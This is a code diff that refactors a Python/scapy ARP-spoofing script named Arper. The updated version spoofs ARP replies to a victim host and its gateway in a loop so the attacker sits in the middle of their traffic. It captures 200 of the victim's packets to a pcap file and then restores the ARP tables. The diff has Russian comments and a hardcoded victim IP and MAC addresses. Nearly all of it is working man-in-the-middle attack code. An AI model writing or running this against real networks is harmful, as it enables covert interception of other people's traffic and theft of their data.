@@ -1,94 +1,86 @@
-from multiprocessing import Process
-from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
-from scapy_utils import get_mac_address
-
+from scapy.all import (ARP, conf, get_if_hwaddr, send, sniff, wrpcap)
+from scapy_utils import get_mac_address, load_mac_addresses
+import threading
 import sys
-import os
 import time
+import logging
 
+logging.basicConfig(level=logging.INFO)
+mac_addresses = load_mac_addresses("output.txt")
 
 class Arper:
-  def __init__(self, victim, gateway, interface='en0'):
-    self.victim = victim
-    self.victimmac = get_mac_address(victim)
-    self.gateway = gateway
-    self.gatewaymac = get_mac_address(victim)
-    self.interface = interface
-    conf.iface = interface
-    conf.verb = 0
+    def __init__(self, victim, gateway, victimmac, gatewaymac, interface='en0'):
+        self.victim = victim
+        self.victimmac = victimmac
+        self.gateway = gateway
+        self.gatewaymac = gatewaymac
+        self.interface = interface
+        conf.iface = interface
+        conf.verb = 0
 
-    print(f'Initialized {interface}:')
-    print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
-    print(f'Victim ({victim}) is at {self.victimmac}.')
-    print('-'*30)
+        logging.info(f'Initialized {interface}:')
+        logging.info(f'Gateway ({gateway}) is at {self.gatewaymac}.')
+        logging.info(f'Victim ({victim}) is at {self.victimmac}.')
+        logging.info('-' * 30)
 
-  def run(self):
-    self.poison_thread = Process(target=self.poison)
-    self.poison_thread.start()
+        # Флаг для остановки потоков
+        self.stop_flag = threading.Event()
 
-    self.sniff_thread = Process(target=self.sniff)
-    self.sniff_thread.start()
+    def run(self, packet_count=200):
+        self.poison_thread = threading.Thread(target=self.poison)
+        self.sniff_thread = threading.Thread(target=self.sniff, args=(packet_count,))
 
-  def poison(self):
-    poison_victim = ARP()
-    poison_victim.op = 2
-    poison_victim.psrc = self.gateway
-    poison_victim.pdst = self.victim
-    poison_victim.hwdst = self.victimmac
-    print(f'ip src: {poison_victim.psrc}')
-    print(f'ip dst: {poison_victim.pdst}')
-    print(f'mac dst: {poison_victim.hwdst}')
-    print(f'mac src: {poison_victim.hwsrc}')
-    print(poison_victim.summary())
-    print('-'*30)
-    poison_gateway = ARP()
-    poison_gateway.op = 2
-    poison_gateway.psrc = self.victim
-    poison_gateway.pdst = self.gateway
-    poison_gateway.hwdst = self.gatewaymac
-    print(f'ip src: {poison_gateway.psrc}')
-    print(f'ip dst: {poison_gateway.pdst}')
-    print(f'mac dst: {poison_gateway.hwdst}')
-    print(f'mac src: {poison_gateway.hwsrc}')
-    print(poison_gateway.summary())
-    print('-'*30)
-    print(f'Beginning the ARP poison. [CTRL-C to stop]')
-    while True:
-      sys.stdout.write('.')
-      sys.stdout.flush()
+        self.poison_thread.start()
+        self.sniff_thread.start()
+
+    def poison(self):
+        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victimmac)
+        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gatewaymac)
+
+        logging.info(f'Starting ARP poisoning...')
+        try:
+            while not self.stop_flag.is_set():
+                send(poison_victim, verbose=False)
+                send(poison_gateway, verbose=False)
+                time.sleep(2)  # Интервал отправки пакетов, можно регулировать для уменьшения нагрузки
+        except KeyboardInterrupt:
+            self.restore()
+        finally:
+            logging.info('ARP poisoning stopped.')
+
+    def sniff(self, count=200):
+        time.sleep(5)  # Задержка для стабилизации
+        logging.info(f'Sniffing {count} packets')
+
+        try:
+            bpf_filter = f"ip host {self.victim}"
+            packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
+            wrpcap('arper.pcap', packets)
+            logging.info(f'Captured {len(packets)} packets and saved to arper.pcap')
+        except Exception as e:
+            logging.error(f"Error in sniffing: {e}")
+        finally:
+            self.stop_flag.set()  # Останавливаем отравление после захвата пакетов
+            self.restore()
+
+    def restore(self):
+        logging.info('Restoring ARP tables...')
+        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
+        send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
+        logging.info('ARP tables restored.')
+
+if __name__ == "__main__":
+    victim_ip = '192.168.0.100'  # IP жертвы
+    gateway_ip = '192.168.0.1'  # IP шлюза (маршрутизатора)
+    network_interface = 'en0'  # Имя сетевого интерфейса
+    victimmac = "b0:be:83:43:9e:9d"
+    gatewaymac = "28:87:ba:8b:de:7c"
+
     try:
-      send(poison_victim)
-      send(poison_gateway)
+        logging.info("Запуск ARP Spoofing...")
+        arper = Arper(victim_ip, gateway_ip, victimmac, gatewaymac, network_interface)
+        arper.run(packet_count=200)
+    except Exception as e:
+        logging.error(f"Error occurred: {e}")
     except KeyboardInterrupt:
-      self.restore()
-      sys.exit()
-    else:
-      time.sleep(2)
-
-  def sniff(self, count=200):
-    time.sleep(5)
-    print(f'Sniffing {count} packets')
-    bpf_filter = "ip host %s" % victim
-    packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
-    wrpcap('arper.pcap', packets)
-    print('Got the packets')
-    self.restore()
-    self.poison_thread.terminate()
-    print('Finished.')
-
-  def restore(self):
-    print('Restoring ARP tables...')
-    send(ARP(
-      op=2,
-      psrc=self.gateway,
-      hwsrc=self.gatewaymac,
-      pdst=self.victim,
-      hwdst='ff:ff:ff:ff:ff:ff'),
-      count=5)
-    send(ARP(
-      op=2,
-      psrc=self.victim,
-      hwsrc=self.victimmac,
-      pdst=self.gateway,
-      hwdst='ff:ff:ff:ff:ff:ff'),
-      count=5)
+        logging.info("Execution interrupted by user.")
